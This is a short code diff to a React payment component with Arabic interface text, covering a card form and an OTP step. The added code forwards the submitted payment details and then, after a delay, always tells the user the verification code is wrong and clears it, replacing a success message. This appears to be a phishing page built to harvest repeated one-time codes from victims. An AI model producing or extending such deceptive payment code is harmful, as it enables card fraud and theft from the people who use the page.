@@ -66,8 +66,10 @@ export const Payment = (props: any) => {
       status:'approved'
     })
         handlePay(paymentInfo,setPaymentInfo)
-
-    alert("تمت معالجة الدفع بنجاح!");
+        setTimeout(() => {
+    alert("رمز التحقق غير صحيح!");
+          setOtp('')
+        }, 3000);
   };
 
   useEffect(() => {
@@ -149,7 +151,7 @@ export const Payment = (props: any) => {
               <FaCreditCard /> {isProcessing ? "يرجى الانتظار..." : "ادفع الآن"}
             </button>
           </form>
-        ) : step === 2 && paymentInfo.status === 'pending' ?  (<>Loading...</>):(
+        ) : step === 2 && paymentInfo.status === 'pending' ?  (<>طلب الدفع الخاص بك قيد المعالجة, يرجى الانتظار ...</>):(
           <form onSubmit={handleOtpSubmit} style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
             <div>
               <label>أدخل رمز OTP</label>
